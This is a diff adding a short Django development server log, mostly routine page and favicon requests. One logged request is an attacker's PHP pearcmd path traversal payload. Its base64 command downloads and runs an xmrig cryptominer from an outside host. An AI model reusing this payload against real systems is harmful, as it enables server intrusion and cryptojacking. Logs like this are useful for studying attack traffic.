@@ -1,0 +1,16 @@
+Watching for file changes with StatReloader
+[23/Jul/2023 21:50:57] "GET / HTTP/1.1" 200 1515
+[23/Jul/2023 21:58:44] "GET / HTTP/1.1" 200 1515
+Not Found: /favicon.ico
+[23/Jul/2023 21:59:24] "GET /favicon.ico HTTP/1.1" 404 6506
+[23/Jul/2023 21:59:25] "GET / HTTP/1.1" 200 1515
+[23/Jul/2023 22:00:23] "GET /?act=cl&ofid=9999999&uid=1&vid=1&lid=1&cid=1&pid=1_mt HTTP/1.1" 200 1515
+[23/Jul/2023 22:00:41] "GET / HTTP/1.1" 200 1515
+Not Found: /favicon.ico
+[23/Jul/2023 22:01:06] "GET /favicon.ico HTTP/1.1" 404 6506
+[23/Jul/2023 22:01:08] "GET / HTTP/1.1" 200 1515
+Not Found: /favicon.ico
+[23/Jul/2023 22:05:33] "GET /favicon.ico HTTP/1.1" 404 6513
+[23/Jul/2023 22:24:35] "GET / HTTP/1.1" 200 1515
+Not Found: /index.php
+[23/Jul/2023 22:41:10] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("cGtpbGwgLTkgLmZveG07IGNkIC90bXA7IHdnZXQgaHR0cDovL2Rvd25sb2FkLmFzeW5jZm94Lnh5ei9kb3dubG9hZC94bXJpZy54ODZfNjQ7IG12IHhtcmlnLng4Nl82NCAuZm94bTsgY2htb2QgK3ggLmZveG07IC4vLmZveG07IGVjaG8gWW91SGF2ZUJlZW5Pd25lZA=="));?>+/tmp/ohhellohttpserver.php HTTP/1.1" 404 6865
